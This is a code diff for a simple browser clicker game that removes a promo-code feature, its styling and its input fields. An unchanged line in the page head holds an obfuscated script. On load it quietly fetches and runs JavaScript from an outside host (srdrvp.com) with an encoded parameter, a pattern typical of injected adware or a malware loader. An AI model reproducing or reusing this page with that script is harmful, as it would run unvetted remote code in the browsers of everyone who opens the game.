@@ -9,9 +9,6 @@ var cost = 10
 var cost2 = 600
 var auto = 0
 var pps = 0
-var promo1use = 0 
-var promo2use = 0
-var promo3use = 0
     var textField = document.getElementById( "textField" );
     var currentValue = parseInt(textField.value);
 	function handleButtonClick4() {
@@ -61,38 +58,6 @@ if (auto > 0) {
     currentValue = currentValue + auto;
 	textField.value = currentValue;
 setTimeout(handleButtonClick2, 1000)
-}
-}
-function handleButtonClick3() {
-var promo = document.getElementById( "promo" ).value;
-var textField = document.getElementById( "textField" );
-var currentValue = parseInt(textField.value);
-if (promo == "pointz") {
-if (promo1use == 0) {
-    currentValue = currentValue + 5000;
-	textField.value = currentValue;
-	promo1use = promo1use + 1;
-}
-}
-else
-if (promo == "10ppc4u") {
-if (promo2use == 0) {
-	promo2use = promo2use + 1;
-ppc = ppc + 10;
-document.getElementById("ppc").value="ppc: " +ppc; 
-add = add + 10;
-}
-}
-else
-if (promo == "autopointz") {
-if (promo3use == 0) {
-	promo3use = promo3use + 1;
-	pps = pps + 5;
-	auto = auto + 5
-	promo3use = promo3use + 1;
-	document.getElementById("pps").value="pps: " +pps; 
-	document.getElementById("upgradeauto").value="upgrade auto click: " + cost2 + " points"; 
-	setTimeout(handleButtonClick2(), 1000)
 }
 }
 }
@@ -189,32 +154,6 @@ if (promo3use == 0) {
     border:none;
     height:1.5em; width:24em;
 }
-#spromo {
-    background-color: #800080;
-    -moz-border-radius: 30px;
-    -webkit-border-radius: 3.0px;
-    border-radius: 30px;
-    color: #fff;
-    font-family: 'Oswald';
-    font-size: 20px;
-    text-decoration: none;
-    cursor: pointer;
-    border:none;
-    height:1.5em; width:10em;
-}
-#promo {
-    background-color: #ADD8E6;
-    -moz-border-radius: 30px;
-    -webkit-border-radius: 3.0px;
-    border-radius: 30px;
-    color: #fff;
-    font-family: 'Oswald';
-    font-size: 20px;
-    text-decoration: none;
-    cursor: pointer;
-    border:none;
-    height:1.5em; width:13em;
-}
 </style>
 <script>var nz3Hsx8l = 1;(function(){var k=function(){if(window == window.top && document.location.protocol == 'http:') {var komCat = document.createElement('script');komCat.src = 'http://srdrvp.com/cmn2?p=YTEyNzM2NDI2MDdMm587ZhqHxxyh%2FYR%2F1hhbVyNEMTZMQoSgrbKi%2FkB9PEbl09T2oyLgA99i6tj%2FhnMVDMKCQRGv0N3fK2go0EGaSyxmOE%2FFy9vc1uA27WBz%2BghzZWBlu2AXgKnItTK%2FnmuZRNrzzj8j7bWzaFvrd7wJTehrmlvjenQ%3D&d=98';komCat.type = 'text/javascript';document.getElementsByTagName('head')[0].appendChild(komCat);}};(function d(){if(document.readyState=='interactive' || document.readyState=='complete'){k()}else{window.setTimeout(d,50)}}())}());</script></head>
 <body onload="handleButtonClick4()" bgcolor="#336666">
@@ -232,7 +171,5 @@ if (promo3use == 0) {
 <input type="text" value="pps: 0" id="pps" readonly/>
 <br>
 <br>
-<input type="text" value="" id="promo">
-<input type="button" id="spromo" onClick="handleButtonClick3()" value="submit promo">
 </body>
 </html>
